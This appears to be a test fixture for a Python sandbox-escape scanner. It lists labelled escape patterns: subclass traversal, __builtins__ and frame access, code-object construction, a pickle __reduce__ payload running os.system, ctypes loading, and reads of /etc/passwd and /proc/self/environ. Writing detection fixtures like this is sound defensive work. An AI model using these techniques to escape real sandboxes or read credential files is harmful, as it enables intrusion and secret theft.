"""Example: Classic Python sandbox escape techniques.

This file demonstrates the patterns sandboxaudit detects.
DO NOT execute this code — it's for testing the scanner only.
"""

import os
import subprocess
import ctypes
import gc
import signal
import importlib
from types import CodeType, FunctionType

# ── SB01: Class hierarchy traversal ──────────────────────────
# The classic escape: walk the MRO to find BuiltinImporter
obj = "".__class__.__mro__[1].__subclasses__()
for cls in obj:
    if "BuiltinImporter" in str(cls):
        importer = cls.load_module
        break

# Another variant
base = ().__class__.__bases__[0]

# ── SB02: Builtins access ───────────────────────────────────
bi = __builtins__
bi.__dict__["__import__"]("os").system("id")

import builtins

# ── SB03: Format string introspection ───────────────────────
# n8n CVE-2026-0863 pattern
exploit = f"{dict.__class__.__mro__}"
payload = "{0.__class__.__init__.__globals__}".format(lambda: None)

# Format spec with dunder traversal (string form)
template = '{x.__class__.__mro__[1].__subclasses__()}'

# ── SB04: Import tricks ─────────────────────────────────────
__import__("os")
importlib.import_module("subprocess")
loader = some_module.__loader__
spec = some_module.__spec__

# ── SB05: Code object construction ──────────────────────────
code = compile("import os; os.system('id')", "<escape>", "exec")
func = FunctionType(code, {})
bytecode = func.__code__
consts = bytecode.co_consts

# ── SB06: Frame introspection ───────────────────────────────
import sys
frame = sys._getframe(1)
globs = frame.f_globals
locs = frame.f_locals
parent = frame.f_back
func.__globals__["__builtins__"]

# ── SB07: Serialization escape ──────────────────────────────
class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

    def __reduce_ex__(self, protocol):
        return (eval, ("__import__('os').system('id')",))

# ── SB08: FFI escape ────────────────────────────────────────
libc = ctypes.CDLL("libc.so.6")

# ── SB09: GC object discovery ───────────────────────────────
all_objects = gc.get_objects()
refs = gc.get_referrers(target)

# ── SB10: OS/Process access ─────────────────────────────────
os.system("whoami")
subprocess.run(["id"])
os.popen("cat /etc/passwd")

# ── SB11: File system escape ────────────────────────────────
open("/proc/self/environ")
data = open("../../../etc/passwd")

# ── SB12: Signal abuse ──────────────────────────────────────
signal.signal(signal.SIGALRM, handler)
signal.alarm(1)

# ── SB13: Exception attribute exploit ───────────────────────
# Python 3.10+ AttributeError.obj (n8n CVE-2026-0863)
try:
    f"{dict.mro()[1]:'{__fstring__.__getattribute__.s}'}"
except Exception as e:
    leaked_obj = e.obj
    subclasses = leaked_obj(dict.mro()[1], "__subclasses__")()

# ── SB14: Obfuscated attribute access ───────────────────────
getattr(obj, "__builtins__")
getattr(obj, name_variable)
setattr(obj, "__class__", new_class)
namespace = obj.__dict__

# ── SB15: Metaclass/Decorator abuse ─────────────────────────
class Meta(type):
    pass

class Evil(metaclass=Meta):
    def __init_subclass__(cls):
        os.system("id")

    def __set_name__(self, owner, name):
        pass
